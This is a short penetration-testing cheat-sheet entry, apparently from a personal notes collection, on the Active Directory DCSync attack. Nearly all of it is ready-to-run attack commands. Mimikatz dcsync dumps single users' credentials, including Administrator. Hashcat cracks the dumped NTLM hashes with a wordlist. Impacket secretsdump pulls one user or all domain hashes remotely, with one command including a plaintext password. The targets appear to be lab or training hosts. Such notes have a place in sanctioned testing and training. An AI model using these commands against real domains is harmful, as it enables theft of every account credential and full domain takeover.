---
title: DCSync
category: ad
subcategory: ad-attacks
os: linux, windows
command: lsadump::dcsync /user:domain\user
tools: mimikatz, impacket-secretsdump
---


### Mimikatz - single user

```
.\mimikatz
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
```

### Crack the dumped NTLM hash

```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Impacket - remote DCSync

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

### Dump all domain NTLM hashes

```bash
impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-whitehat@10.10.176.223
```
